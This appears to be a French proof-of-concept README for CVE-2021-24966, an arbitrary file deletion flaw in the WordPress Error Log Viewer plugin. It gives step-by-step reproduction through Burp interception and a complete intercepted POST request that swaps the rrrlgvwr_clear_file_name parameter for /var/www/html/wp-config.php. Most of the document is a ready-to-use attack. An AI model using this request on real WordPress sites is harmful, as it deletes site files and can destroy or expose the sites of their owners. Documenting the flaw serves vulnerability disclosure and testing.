# CVE-2021-24966
Cet exploit est produite sur Wordpress via le plugin utilitaire Error Log Viewer qui permet d'afficher les fichiers journaux contenant des erreurs directement depuis le tableau de bord d'administration de WordPress.
On peut accéder à tous les fichiers journaux à partir d'un seul endroit, affichez la dernière activité, sélectionnez les journaux par date, affichez un fichier journal complet ou effacez un fichier journal.
La fonctionnalité "effacer un fichier journal" peut être utilisée pour supprimer un fichier arbitraire dans un site Web Wordpress.
Cet exploit nécessite un compte utilisateur authentifié pour être utilisé, un attaquant peut par exemple utilisé cet exploit pour détruire un site via la suppression des fichiers du site

## Repoduction

 - Installer et activé le plugin 
 - Clické sur "Log Monitor" qui se trouve dans Log Viewers
 - choisir un fihcier log à effacer
 - Intercepté la requête avec Burp ou un autre client proxy 
 - Une fois la requête intercepté changer le parametre "rrrlgvwr_clear_file_name" avec le chemin d'un fichier tel que /var/www/site/wp-config.php

## Exemple de requête intercepté
    POST /wp-admin/admin.php?page=rrrlgvwr-monitor.php HTTP/1.1
    Host: 127.0.0.1:8000
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 603
    Connection: close
    Upgrade-Insecure-Requests: 1
    Cookie: [admin+]

    rrrlgvwr_select_log=%2Fvar%2Fwww%2Fhtml%2Fwp-content%2Fplugins%2Flearnpress%2Finc%2Fgateways%2Fpaypal%2Fpaypal-ipn%2Fipn_errors.log&rrrlgvwr_lines_count=10&rrrlgvwr_from=&rrrlgvwr_to=&rrrlgvwr_show_content=all&rrrlgvwr_newcontent=%5B05-Feb-2015+07%3A28%3A49+UTC%5D+Invalid+HTTP+request+method.%0D%0A%0D%0A++++++++++++++++++++++++&rrrlgvwr_clear_file=Clear+log+file&rrrlgvwr_clear_file_name=/var/www/html/wp-config.php&rrrlgvwr_nonce_name=1283d54cc5&_wp_http_referer=%2Fwp-admin%2Fadmin.php%3Fpage%3Drrrlgvwr-monitor.php


## Mettre à jour
